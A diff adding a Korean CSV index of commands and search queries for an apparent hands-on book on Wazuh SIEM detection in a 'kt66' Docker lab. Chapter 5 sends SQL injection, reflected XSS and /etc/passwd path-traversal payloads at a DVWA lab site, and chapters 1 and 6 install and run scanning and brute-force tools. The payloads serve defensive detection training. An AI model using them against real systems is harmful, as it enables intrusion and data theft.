@@ -1,0 +1,966 @@
+﻿장,절,번호,종류,입력 위치,입력,복사용 파일
+1,1.3  운영체제·자원 확인,C01-01,command,kt66 VM · 터미널,cat /etc/os-release,examples/chapter01/C01-01.txt
+1,1.3  운영체제·자원 확인,C01-02,command,kt66 VM · 터미널,uname -m,examples/chapter01/C01-02.txt
+1,1.3  운영체제·자원 확인,C01-03,command,kt66 VM · 터미널,free -h,examples/chapter01/C01-03.txt
+1,1.3  운영체제·자원 확인,C01-04,command,kt66 VM · 터미널,df -h /,examples/chapter01/C01-04.txt
+1,VM 주소 확인하기,C01-05,command,kt66 VM · 터미널,ip -4 -br address,examples/chapter01/C01-05.txt
+1,VM 주소 확인하기,C01-06,command,kt66 VM · 터미널,ip route,examples/chapter01/C01-06.txt
+1,설치 도구 준비하기,C01-07,command,kt66 VM · 터미널,"dpkg -s git curl openssl jq nano python3 \
+  python3-yaml gnupg ca-certificates openssh-client",examples/chapter01/C01-07.txt
+1,설치 도구 준비하기,C01-08,command,kt66 VM · 터미널,sudo apt-get update,examples/chapter01/C01-08.txt
+1,설치 도구 준비하기,C01-09,command,kt66 VM · 터미널,"sudo apt-get install git curl ca-certificates openssl jq \
+  nano python3 python3-yaml gnupg openssh-client",examples/chapter01/C01-09.txt
+1,1.4  kt66 저장소 받기,C01-10,command,kt66 VM · 터미널,cd ~,examples/chapter01/C01-10.txt
+1,1.4  kt66 저장소 받기,C01-11,command,kt66 VM · 터미널,pwd,examples/chapter01/C01-11.txt
+1,1.4  kt66 저장소 받기,C01-12,command,kt66 VM · 터미널,ls -ld kt66,examples/chapter01/C01-12.txt
+1,1.4  kt66 저장소 받기,C01-13,command,kt66 VM · 터미널,git clone https://github.com/mrgrit/kt66.git,examples/chapter01/C01-13.txt
+1,1.4  kt66 저장소 받기,C01-14,command,kt66 VM · 터미널,cd kt66,examples/chapter01/C01-14.txt
+1,책의 코드 버전으로 맞추기,C01-15,command,kt66 VM · ~/kt66,git status --short,examples/chapter01/C01-15.txt
+1,책의 코드 버전으로 맞추기,C01-16,command,kt66 VM · ~/kt66,git checkout --detach 63d4180,examples/chapter01/C01-16.txt
+1,책의 코드 버전으로 맞추기,C01-17,command,kt66 VM · ~/kt66,git rev-parse --short=7 HEAD,examples/chapter01/C01-17.txt
+1,설정 파일 만들기,C01-18,command,kt66 VM · ~/kt66,ls -l .env.example .env,examples/chapter01/C01-18.txt
+1,설정 파일 만들기,C01-19,command,kt66 VM · ~/kt66,cp .env.example .env,examples/chapter01/C01-19.txt
+1,설정 파일 만들기,C01-20,command,kt66 VM · ~/kt66,chmod 600 .env,examples/chapter01/C01-20.txt
+1,설정 파일 만들기,C01-21,command,kt66 VM · ~/kt66,openssl rand -hex 32,examples/chapter01/C01-21.txt
+1,필요한 설정만 바꾸기,C01-22,command,kt66 VM · ~/kt66,nano .env,examples/chapter01/C01-22.txt
+1,필요한 설정만 바꾸기,C01-23,command,kt66 VM · ~/kt66,grep -E '^(SSH_USER|TZ)=' .env,examples/chapter01/C01-23.txt
+1,1.5  인덱서의 메모리 매핑 한도,C01-24,command,kt66 VM · 터미널,sysctl vm.max_map_count,examples/chapter01/C01-24.txt
+1,1.5  인덱서의 메모리 매핑 한도,C01-25,command,kt66 VM · 터미널,ls -l /etc/sysctl.d/99-wazuh-book.conf,examples/chapter01/C01-25.txt
+1,1.5  인덱서의 메모리 매핑 한도,C01-26,command,kt66 VM · 터미널,sudo nano /etc/sysctl.d/99-wazuh-book.conf,examples/chapter01/C01-26.txt
+1,1.5  인덱서의 메모리 매핑 한도,C01-27,command,kt66 VM · 터미널,sudo sysctl -p /etc/sysctl.d/99-wazuh-book.conf,examples/chapter01/C01-27.txt
+1,1.6  Docker 설치하기,C01-28,command,kt66 VM · 터미널,ls -l /etc/docker/daemon.json,examples/chapter01/C01-28.txt
+1,1.6  Docker 설치하기,C01-29,command,kt66 VM · 터미널,sudo cat /etc/docker/daemon.json,examples/chapter01/C01-29.txt
+1,1.6  Docker 설치하기,C01-30,command,kt66 VM · ~/kt66,./kt66.sh install,examples/chapter01/C01-30.txt
+1,Docker와 저장된 주소 확인,C01-31,command,kt66 VM · 터미널,sudo cat /etc/docker/daemon.json,examples/chapter01/C01-31.txt
+1,Docker와 저장된 주소 확인,C01-32,command,kt66 VM · 터미널,docker --version,examples/chapter01/C01-32.txt
+1,Docker와 저장된 주소 확인,C01-33,command,kt66 VM · 터미널,docker compose version,examples/chapter01/C01-33.txt
+1,Docker와 저장된 주소 확인,C01-34,command,kt66 VM · 터미널,docker ps,examples/chapter01/C01-34.txt
+1,설정값을 골라 읽기,C01-35,command,kt66 VM · ~/kt66,"grep -E \
+'^(WEB_HOST_IP|INT_HOST_IP|LAB_DOMAIN|WINDOWS_ENABLED)=' \
+  .env",examples/chapter01/C01-35.txt
+1,1.7  kt66 기동하기,C01-36,command,kt66 VM · ~/kt66,./kt66.sh up,examples/chapter01/C01-36.txt
+1,1.7  kt66 기동하기,C01-37,command,kt66 VM · ~/kt66,docker compose ps -a,examples/chapter01/C01-37.txt
+1,1.9  호스트 센서 확인,C01-38,command,kt66 VM · 터미널,systemctl is-active wazuh-agent,examples/chapter01/C01-38.txt
+1,1.9  호스트 센서 확인,C01-39,command,kt66 VM · 터미널,systemctl is-active osqueryd,examples/chapter01/C01-39.txt
+1,1.10  중지·재기동·원상복구,C01-40,command,kt66 VM · ~/kt66,docker compose ps -a,examples/chapter01/C01-40.txt
+1,1.10  중지·재기동·원상복구,C01-41,command,kt66 VM · ~/kt66,./kt66.sh down,examples/chapter01/C01-41.txt
+1,1.11  설치가 멈췄을 때,C01-42,command,kt66 VM · 터미널,getent hosts github.com,examples/chapter01/C01-42.txt
+1,1.11  설치가 멈췄을 때,C01-43,command,kt66 VM · 터미널,curl -I --max-time 15 https://github.com,examples/chapter01/C01-43.txt
+1,1.11  설치가 멈췄을 때,C01-44,command,kt66 VM · 터미널,id -nG,examples/chapter01/C01-44.txt
+1,1.11  설치가 멈췄을 때,C01-45,command,kt66 VM · 터미널,"sudo usermod -aG docker ""$USER""",examples/chapter01/C01-45.txt
+1,화면이 열리지 않을 때,C01-46,command,kt66 VM · ~/kt66,docker compose logs --tail 50 wazuh-dashboard,examples/chapter01/C01-46.txt
+1,화면이 열리지 않을 때,C01-47,command,kt66 VM · ~/kt66,docker compose logs --tail 50 wazuh-indexer,examples/chapter01/C01-47.txt
+1,센서가 연결되지 않을 때,C01-48,command,kt66 VM · 터미널,sudo systemctl status wazuh-agent --no-pager,examples/chapter01/C01-48.txt
+1,센서가 연결되지 않을 때,C01-49,command,kt66 VM · 터미널,sudo journalctl -u wazuh-agent -n 50 --no-pager,examples/chapter01/C01-49.txt
+1,센서가 연결되지 않을 때,C01-50,command,kt66 VM · ~/kt66,docker compose logs --tail 50 siem,examples/chapter01/C01-50.txt
+1,센서가 연결되지 않을 때,C01-51,command,kt66 VM · ~/kt66,sudo ./deployment/host-sensors.sh,examples/chapter01/C01-51.txt
+1,공격 도구 일괄 설치,C01-52,command,공격자 VM · 터미널,"sudo apt update && sudo apt install -y \
+  nmap hydra sqlmap nikto dirb gobuster curl \
+  netcat-openbsd python3 python3-requests sshpass",examples/chapter01/C01-52.txt
+1,공격자 VM 준비 확인,C01-53,command,공격자 VM · 터미널,"dpkg -s nmap hydra sqlmap nikto dirb gobuster curl \
+  netcat-openbsd python3 python3-requests sshpass",examples/chapter01/C01-53.txt
+1,공격자 VM 준비 확인,C01-54,command,공격자 VM · 터미널,curl -I --max-time 15 http://192.168.0.189/,examples/chapter01/C01-54.txt
+2,2.4  시각과 수집 위치 맞추기,C02-01,command,kt66 VM · 터미널,date -Is,examples/chapter02/C02-01.txt
+2,2.4  시각과 수집 위치 맞추기,C02-02,command,kt66 VM · 터미널,date -u -Is,examples/chapter02/C02-02.txt
+2,2.5  웹 응답과 공격 결과 구분,C02-03,command,kt66 VM · 터미널,curl -I --max-time 15 http://192.168.0.189/,examples/chapter02/C02-03.txt
+3,3.5  에이전트 이름으로 검색,Q03-01,query,Windows · Discover 검색창,"agent.name: ""kt66-host""",examples/chapter03/Q03-01.txt
+3,3.7  SSH 실패 사례 · 검색 조건,Q03-02,query,Windows · Discover 검색창,"agent.name: ""bastion"" AND rule.id: ""5710""",examples/chapter03/Q03-02.txt
+3,3.7  SSH 실패 사례 · 검색 조건,Q03-03,query,Windows · Discover 검색창,"agent.name: ""bastion"" AND rule.id: ""5710""
+AND data.srcip: ""10.20.30.254""",examples/chapter03/Q03-03.txt
+4,4.2  수집 파일 확인,C04-01,command,kt66 VM · 호스트 터미널,docker exec -it kt66-bastion /bin/bash,examples/chapter04/C04-01.txt
+4,4.2  수집 파일 확인,C04-02,command,kt66-bastion 컨테이너 안,hostname,examples/chapter04/C04-02.txt
+4,4.2  수집 파일 확인,C04-03,command,kt66-bastion 컨테이너 안,"grep -F -B 1 -A 1 '/var/log/auth.log' \
+  /var/ossec/etc/ossec.conf",examples/chapter04/C04-03.txt
+4,4.3  확인 문구 기록,C04-04,command,kt66-bastion 컨테이너 안,"grep -F 'book04: book04-collection-01' \
+  /var/log/auth.log",examples/chapter04/C04-04.txt
+4,4.3  확인 문구 기록,C04-05,command,kt66-bastion 컨테이너 안,"logger -p authpriv.notice -t book04 \
+  'book04-collection-01'",examples/chapter04/C04-05.txt
+4,4.3  기록 결과 확인,C04-06,command,kt66-bastion 컨테이너 안,"grep -F 'book04: book04-collection-01' \
+  /var/log/auth.log",examples/chapter04/C04-06.txt
+4,4.3  기록 결과 확인,C04-07,command,kt66-bastion 컨테이너 안,exit,examples/chapter04/C04-07.txt
+4,4.4  아카이브에서 찾기,Q04-01,query,Windows · Discover 검색창,"agent.name: ""bastion""
+AND predecoder.program_name: ""book04""",examples/chapter04/Q04-01.txt
+4,4.5  디코더 정의 직접 확인,C04-08,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter04/C04-08.txt
+4,4.5  디코더 정의 직접 확인,C04-09,command,kt66-siem 컨테이너 안,cd /var/ossec/ruleset/decoders,examples/chapter04/C04-09.txt
+4,4.5  디코더 정의 직접 확인,C04-10,command,kt66-siem 컨테이너 안,"grep -n -A 2 '<decoder name=""sshd"">' \
+  0310-ssh_decoders.xml",examples/chapter04/C04-10.txt
+4,4.5  디코더 정의 직접 확인,C04-11,command,kt66-siem 컨테이너 안,"grep -n -A 5 '<decoder name=""ssh-invfailed"">' \
+  0310-ssh_decoders.xml",examples/chapter04/C04-11.txt
+4,4.5  추출 결과와 경보 대조,C04-12,command,kt66-siem 컨테이너 안,exit,examples/chapter04/C04-12.txt
+4,4.6  규칙 파일 확인,C04-13,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter04/C04-13.txt
+4,4.6  규칙 파일 확인,C04-14,command,kt66-siem 컨테이너 안,cd /var/ossec/ruleset/rules,examples/chapter04/C04-14.txt
+4,4.6  규칙 파일 확인,C04-15,command,kt66-siem 컨테이너 안,"grep -n -A 3 '<rule id=""5700""' \
+  0095-sshd_rules.xml",examples/chapter04/C04-15.txt
+4,4.6  규칙 파일 확인,C04-16,command,kt66-siem 컨테이너 안,"grep -n -A 3 '<rule id=""5710""' \
+  0095-sshd_rules.xml",examples/chapter04/C04-16.txt
+4,4.6  규칙 파일 확인,C04-17,command,kt66-siem 컨테이너 안,exit,examples/chapter04/C04-17.txt
+4,4.7  확인 문구용 규칙 준비,C04-18,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter04/C04-18.txt
+4,4.7  확인 문구용 규칙 준비,C04-19,command,kt66-siem 컨테이너 안,ls -l /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-19.txt
+4,4.7  확인 문구용 규칙 준비,C04-20,command,kt66-siem 컨테이너 안,"grep -R -n '100410' /var/ossec/etc/rules \
+  /var/ossec/ruleset/rules",examples/chapter04/C04-20.txt
+4,4.7  규칙 파일 작성,C04-21,command,kt66-siem 컨테이너 안,nano /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-21.txt
+4,4.7  저장 내용과 권한 확인,C04-22,command,kt66-siem 컨테이너 안,cat /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-22.txt
+4,4.7  저장 내용과 권한 확인,C04-23,command,kt66-siem 컨테이너 안,"chown root:wazuh \
+  /var/ossec/etc/rules/book04_rules.xml",examples/chapter04/C04-23.txt
+4,4.7  저장 내용과 권한 확인,C04-24,command,kt66-siem 컨테이너 안,chmod 640 /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-24.txt
+4,4.7  저장 내용과 권한 확인,C04-25,command,kt66-siem 컨테이너 안,ls -l /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-25.txt
+4,4.8  규칙 검사,C04-26,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-analysisd -t,examples/chapter04/C04-26.txt
+4,4.8  규칙 검사,C04-27,command,kt66-siem 컨테이너 안,echo $?,examples/chapter04/C04-27.txt
+4,4.9  적용하고 새 로그 발생,C04-28,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-control restart,examples/chapter04/C04-28.txt
+4,4.9  적용하고 새 로그 발생,C04-29,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-control status,examples/chapter04/C04-29.txt
+4,4.9  적용하고 새 로그 발생,C04-30,command,kt66-siem 컨테이너 안,exit,examples/chapter04/C04-30.txt
+4,4.9  새 경보 확인,C04-31,command,kt66 VM · 호스트 터미널,docker exec -it kt66-bastion /bin/bash,examples/chapter04/C04-31.txt
+4,4.9  새 경보 확인,C04-32,command,kt66-bastion 컨테이너 안,"logger -p authpriv.notice -t book04 \
+  'book04-collection-01'",examples/chapter04/C04-32.txt
+4,4.9  새 경보 확인,C04-33,command,kt66-bastion 컨테이너 안,"grep -F 'book04: book04-collection-01' \
+  /var/log/auth.log",examples/chapter04/C04-33.txt
+4,4.9  새 경보 확인,C04-34,command,kt66-bastion 컨테이너 안,exit,examples/chapter04/C04-34.txt
+4,4.9  새 경보 확인,Q04-02,query,Windows · Discover 검색창,"agent.name: ""bastion"" AND rule.id: ""100410""",examples/chapter04/Q04-02.txt
+4,4.10  실습 규칙 원상복구,C04-35,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter04/C04-35.txt
+4,4.10  실습 규칙 원상복구,C04-36,command,kt66-siem 컨테이너 안,cat /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-36.txt
+4,4.10  실습 규칙 원상복구,C04-37,command,kt66-siem 컨테이너 안,rm /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-37.txt
+4,4.10  실습 규칙 원상복구,C04-38,command,kt66-siem 컨테이너 안,ls -l /var/ossec/etc/rules/book04_rules.xml,examples/chapter04/C04-38.txt
+4,4.10  원상복구 후 실행 확인,C04-39,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-analysisd -t,examples/chapter04/C04-39.txt
+4,4.10  원상복구 후 실행 확인,C04-40,command,kt66-siem 컨테이너 안,echo $?,examples/chapter04/C04-40.txt
+4,4.10  원상복구 후 실행 확인,C04-41,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-control restart,examples/chapter04/C04-41.txt
+4,4.10  원상복구 후 실행 확인,C04-42,command,kt66-siem 컨테이너 안,/var/ossec/bin/wazuh-control status,examples/chapter04/C04-42.txt
+4,4.10  원상복구 후 실행 확인,C04-43,command,kt66-siem 컨테이너 안,exit,examples/chapter04/C04-43.txt
+4,4.11  아카이브 설정 확인,C04-44,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter04/C04-44.txt
+4,4.11  아카이브 설정 확인,C04-45,command,kt66-siem 컨테이너 안,"grep -E 'logall_json|log_alert_level' \
+  /var/ossec/etc/ossec.conf",examples/chapter04/C04-45.txt
+4,4.11  아카이브 설정 확인,C04-46,command,kt66-siem 컨테이너 안,grep -A 2 'archives:' /etc/filebeat/filebeat.yml,examples/chapter04/C04-46.txt
+4,4.11  아카이브 설정 확인,C04-47,command,kt66-siem 컨테이너 안,exit,examples/chapter04/C04-47.txt
+5,5.2  브라우저 접속 준비,C05-01,command,kt66 VM · ~/kt66,grep -E '^(WEB_HOST_IP|LAB_DOMAIN)=' .env,examples/chapter05/C05-01.txt
+5,5.4  아카이브에서 기준 기록 찾기,Q05-01,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND data.url: ""/vulnerabilities/sqli/?id=1&Submit=Submit""",examples/chapter05/Q05-01.txt
+5,5.4  Apache 원본 로그 확인,C05-02,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter05/C05-02.txt
+5,5.4  Apache 원본 로그 확인,C05-03,command,kt66-web 컨테이너 안,cd /var/log/apache2,examples/chapter05/C05-03.txt
+5,5.4  Apache 원본 로그 확인,C05-04,command,kt66-web 컨테이너 안,"grep -F '/vulnerabilities/sqli/?id=1&Submit=Submit' \
+  dvwa_access.log",examples/chapter05/C05-04.txt
+5,5.4  Apache 원본 로그 확인,C05-05,command,kt66-web 컨테이너 안,exit,examples/chapter05/C05-05.txt
+5,5.5  SQL 요청을 Wazuh에서 찾기,Q05-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url: *vulnerabilities/sqli/*
+AND data.url: *UNION*",examples/chapter05/Q05-02.txt
+5,5.6  WAF 차단 근거 찾기,Q05-03,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND location: ""/var/log/apache2/modsec_audit.log""
+AND data.request.request_line: *UNION*",examples/chapter05/Q05-03.txt
+5,5.7  XSS 요청의 경보 읽기,Q05-04,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url: *vulnerabilities/xss_r/*
+AND rule.id: ""31105""",examples/chapter05/Q05-04.txt
+5,5.8  주소창에서 파일 경로 바꾸기,Q05-05,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND data.url: *book05-browser-path*",examples/chapter05/Q05-05.txt
+5,5.9  탐지 조건을 넓혀 찾기,Q05-06,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND
+(rule.id: ""31104"" OR data.url: *etc*passwd*)",examples/chapter05/Q05-06.txt
+5,5.9  탐지 조건을 넓혀 찾기,Q05-07,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.srcip: ""10.20.30.254""
+AND (rule.id: ""31104"" OR data.url: *etc*passwd*)",examples/chapter05/Q05-07.txt
+5,5.10  WAF와 수집 설정 확인,C05-06,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter05/C05-06.txt
+5,5.10  WAF와 수집 설정 확인,C05-07,command,kt66-web 컨테이너 안,"grep -n -E '^SecRuleEngine|^SecAuditEngine' \
+  /etc/modsecurity/modsecurity.conf",examples/chapter05/C05-07.txt
+5,5.10  WAF와 수집 설정 확인,C05-08,command,kt66-web 컨테이너 안,"grep -n -E 'ServerName|SecRuleEngine' \
+  /etc/apache2/sites-enabled/020-dvwa.conf",examples/chapter05/C05-08.txt
+5,5.10  수집 설정 확인,C05-09,command,kt66-web 컨테이너 안,"grep -F -B 1 -A 1 '*_access.log' \
+  /var/ossec/etc/ossec.conf",examples/chapter05/C05-09.txt
+5,5.10  수집 설정 확인,C05-10,command,kt66-web 컨테이너 안,"grep -F -B 1 -A 1 'modsec_audit.log' \
+  /var/ossec/etc/ossec.conf",examples/chapter05/C05-10.txt
+5,5.10  수집 설정 확인,C05-11,command,kt66-web 컨테이너 안,exit,examples/chapter05/C05-11.txt
+5,5.10  Wazuh 규칙 파일 확인,C05-12,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter05/C05-12.txt
+5,5.10  Wazuh 규칙 파일 확인,C05-13,command,kt66-siem 컨테이너 안,cd /var/ossec/ruleset/rules,examples/chapter05/C05-13.txt
+5,5.10  Wazuh 규칙 파일 확인,C05-14,command,kt66-siem 컨테이너 안,"grep -n -A 9 '<rule id=""31104""' \
+  0245-web_rules.xml",examples/chapter05/C05-14.txt
+5,5.10  Wazuh 규칙 파일 확인,C05-15,command,kt66-siem 컨테이너 안,exit,examples/chapter05/C05-15.txt
+5,5.13  다른 방법 · 같은 요청을 curl로 보내기,C05-16,command,공격자 VM · 터미널,curl --version,examples/chapter05/C05-16.txt
+5,5.13  다른 방법 · 같은 요청을 curl로 보내기,C05-17,command,공격자 VM · 터미널,ip -br -4 address,examples/chapter05/C05-17.txt
+5,5.13  공격자 VM의 이름 설정,C05-18,command,공격자 VM · 터미널,grep -n -F 'dvwa.' /etc/hosts,examples/chapter05/C05-18.txt
+5,5.13  공격자 VM의 이름 설정,C05-19,command,공격자 VM · 터미널,sudo nano /etc/hosts,examples/chapter05/C05-19.txt
+5,5.13  공격자 VM의 이름 설정,C05-20,command,공격자 VM · 터미널,getent hosts dvwa.kt66.lab,examples/chapter05/C05-20.txt
+5,5.13  공격자 VM의 이름 설정,C05-21,command,공격자 VM · 터미널,DVWA='http://dvwa.kt66.lab',examples/chapter05/C05-21.txt
+5,5.13  공격자 VM의 이름 설정,C05-22,command,공격자 VM · 터미널,"echo ""$DVWA""",examples/chapter05/C05-22.txt
+5,5.13  시각 확인,C05-23,command,공격자 VM · 터미널,date -Is,examples/chapter05/C05-23.txt
+5,5.13  시각 확인,C05-24,command,kt66 VM · 호스트 터미널,date -Is,examples/chapter05/C05-24.txt
+5,5.13  시각 확인,C05-25,command,공격자 VM · 터미널,timedatectl status,examples/chapter05/C05-25.txt
+5,5.13  시각 확인,C05-26,command,공격자 VM · 터미널,sudo timedatectl set-ntp true,examples/chapter05/C05-26.txt
+5,5.13  curl의 기본 응답 확인,C05-27,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 ""$DVWA/login.php""",examples/chapter05/C05-27.txt
+5,5.13  curl로 정상 값 보내기,C05-28,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 --get \
+  ""$DVWA/vulnerabilities/sqli/"" \
+  --data-urlencode 'id=1' \
+  --data-urlencode 'Submit=Submit' \
+  --data-urlencode 'bookcase=book05-normal'",examples/chapter05/C05-28.txt
+5,5.13  curl로 SQL 입력 보내기,C05-29,command,공격자 VM · 터미널,"PAYLOAD=""1' UNION SELECT user,password FROM users-- """,examples/chapter05/C05-29.txt
+5,5.13  curl로 SQL 입력 보내기,C05-30,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 --get \
+  ""$DVWA/vulnerabilities/sqli/"" \
+  --data-urlencode ""id=$PAYLOAD"" \
+  --data-urlencode 'Submit=Submit' \
+  --data-urlencode 'bookcase=book05-sqli'",examples/chapter05/C05-30.txt
+5,5.13  curl로 스크립트 보내기,C05-31,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 --get \
+  ""$DVWA/vulnerabilities/xss_r/"" \
+  --data-urlencode 'name=<script>alert(1)</script>' \
+  --data-urlencode 'bookcase=book05-xss'",examples/chapter05/C05-31.txt
+5,5.13  curl로 인코딩한 경로 보내기,C05-32,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 --get \
+  ""$DVWA/vulnerabilities/fi/"" \
+  --data-urlencode 'page=../../../../../etc/passwd' \
+  --data 'bookcase=book05-path'",examples/chapter05/C05-32.txt
+5,5.13  curl로 슬래시를 그대로 보내기,C05-33,command,공격자 VM · 터미널,"curl -sS -i --max-time 15 --get \
+  ""$DVWA/vulnerabilities/fi/"" \
+  --data 'page=../../../../../etc/passwd' \
+  --data 'bookcase=book05-path-raw'",examples/chapter05/C05-33.txt
+5,5.13  curl 실습 원상복구,C05-34,command,공격자 VM · 터미널,grep -n -F 'dvwa.' /etc/hosts,examples/chapter05/C05-34.txt
+5,5.13  curl 실습 원상복구,C05-35,command,공격자 VM · 터미널,sudo nano /etc/hosts,examples/chapter05/C05-35.txt
+5,5.13  curl 실습 원상복구,C05-36,command,공격자 VM · 터미널,grep -n -F 'dvwa.' /etc/hosts,examples/chapter05/C05-36.txt
+5,5.13  curl 실습 원상복구,C05-37,command,공격자 VM · 터미널,unset DVWA PAYLOAD,examples/chapter05/C05-37.txt
+6,6.2  없는 경로의 응답과 경보,Q06-01,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND data.url: ""/book06-missing""",examples/chapter06/Q06-01.txt
+6,6.2  목록 탐색 도구 준비,C06-01,command,공격자 VM · 터미널,gobuster -h,examples/chapter06/C06-01.txt
+6,6.2  설치와 이름 해석 확인,C06-02,command,공격자 VM · 터미널,sudo apt update,examples/chapter06/C06-02.txt
+6,6.2  설치와 이름 해석 확인,C06-03,command,공격자 VM · 터미널,sudo apt install gobuster,examples/chapter06/C06-03.txt
+6,6.2  설치와 이름 해석 확인,C06-04,command,공격자 VM · 터미널,getent hosts dvwa.kt66.lab,examples/chapter06/C06-04.txt
+6,6.2  탐색할 경로 목록 만들기,C06-05,command,공격자 VM · 터미널,cd ~,examples/chapter06/C06-05.txt
+6,6.2  탐색할 경로 목록 만들기,C06-06,command,공격자 VM · 터미널,ls -l book06-paths.txt,examples/chapter06/C06-06.txt
+6,6.2  탐색할 경로 목록 만들기,C06-07,command,공격자 VM · 터미널,nano book06-paths.txt,examples/chapter06/C06-07.txt
+6,6.2  탐색할 경로 목록 만들기,C06-08,command,공격자 VM · 터미널,cat book06-paths.txt,examples/chapter06/C06-08.txt
+6,6.2  목록을 사용해 탐색하기,C06-09,command,공격자 VM · 터미널,"gobuster -m dir \
+  -u http://dvwa.kt66.lab/ \
+  -w book06-paths.txt -t 1 -a book06-scan",examples/chapter06/C06-09.txt
+6,6.2  반복 요청 검색,Q06-02,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND full_log: ""book06-scan""",examples/chapter06/Q06-02.txt
+6,6.2  반복 요청 검색,Q06-03,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND rule.id: ""31151""
+AND full_log: ""book06-scan""",examples/chapter06/Q06-03.txt
+6,6.2  반복 경보의 조건 확인,C06-10,command,kt66 VM · 호스트 터미널,docker exec -it kt66-siem /bin/bash,examples/chapter06/C06-10.txt
+6,6.2  반복 경보의 조건 확인,C06-11,command,kt66-siem 컨테이너 안,cd /var/ossec/ruleset/rules,examples/chapter06/C06-11.txt
+6,6.2  반복 경보의 조건 확인,C06-12,command,kt66-siem 컨테이너 안,"sed -n '/<rule id=""31151""/,/<\/rule>/p' \
+  0245-web_rules.xml",examples/chapter06/C06-12.txt
+6,6.2  반복 경보의 조건 확인,C06-13,command,kt66-siem 컨테이너 안,exit,examples/chapter06/C06-13.txt
+6,6.3  User-Agent 기록 검색,Q06-04,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.url: ""/book06-ua""
+AND full_log: ""sqlmap""",examples/chapter06/Q06-04.txt
+6,6.3  WAF의 차단 이유 읽기,Q06-05,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND location: ""/var/log/apache2/modsec_audit.log""
+AND data.request.request_line: *book06-ua*",examples/chapter06/Q06-05.txt
+6,6.4  일반 로그인 기록 찾기,Q06-06,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web"" AND data.protocol: ""POST""
+AND data.url: ""/login.php""",examples/chapter06/Q06-06.txt
+6,6.4  인증 시도의 URL 읽기,Q06-07,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND data.url: *vulnerabilities/brute/*
+AND data.url: *username=admin*",examples/chapter06/Q06-07.txt
+6,6.5  메서드 요청의 접속 기록,Q06-08,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND data.protocol: ""PROPFIND""
+AND data.url: ""/book06-method""",examples/chapter06/Q06-08.txt
+6,6.5  허용 메서드 정책과 대조,Q06-09,query,Windows · Discover · wazuh-archives-*,"agent.name: ""web""
+AND location: ""/var/log/apache2/modsec_audit.log""
+AND data.request.request_line: *book06-method*",examples/chapter06/Q06-09.txt
+6,6.6  관리 경로의 출발지 조사,Q06-10,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web""
+AND data.url: (""/admin/"" OR ""/phpmyadmin/""
+OR ""/wp-admin/"" OR ""/manager/html"")",examples/chapter06/Q06-10.txt
+6,6.7  길이 경보 읽기,Q06-11,query,Windows · Discover · wazuh-alerts-*,"agent.name: ""web"" AND rule.id: ""31115""
+AND data.url: *book06-long*",examples/chapter06/Q06-11.txt
+6,6.8  원본 access 로그 확인,C06-14,command,kt66 VM · 호스트 터미널,docker exec -it kt66-web /bin/bash,examples/chapter06/C06-14.txt
+6,6.8  원본 access 로그 확인,C06-15,command,kt66-web 컨테이너 안,cd /var/log/apache2,examples/chapter06/C06-15.txt
+6,6.8  원본 access 로그 확인,C06-16,command,kt66-web 컨테이너 안,grep -F 'book06-scan' dvwa_access.log,examples/chapter06/C06-16.txt
+6,6.8  원본 access 로그 확인,C06-17,command,kt66-web 컨테이너 안,exit,examples/chapter06/C06-17.txt
+6,6.8  로그인 처리 코드의 위치,C06-18,command,kt66 VM · 호스트 터미널,docker exec -it kt66-dvwa /bin/bash,examples/chapter06/C06-18.txt
+6,6.8  로그인 처리 코드의 위치,C06-19,command,kt66-dvwa 컨테이너 안,cd /var/www/html,examples/chapter06/C06-19.txt
+6,6.8  로그인 처리 코드의 위치,C06-20,command,kt66-dvwa 컨테이너 안,"grep -nE 'checkToken|generateSessionToken|dvwaRedirect' \
+  login.php",examples/chapter06/C06-20.txt
+6,6.8  로그인 처리 코드의 위치,C06-21,command,kt66-dvwa 컨테이너 안,"grep -nE 'GET|Welcome|incorrect' \
+  vulnerabilities/brute/source/low.php",examples/chapter06/C06-21.txt
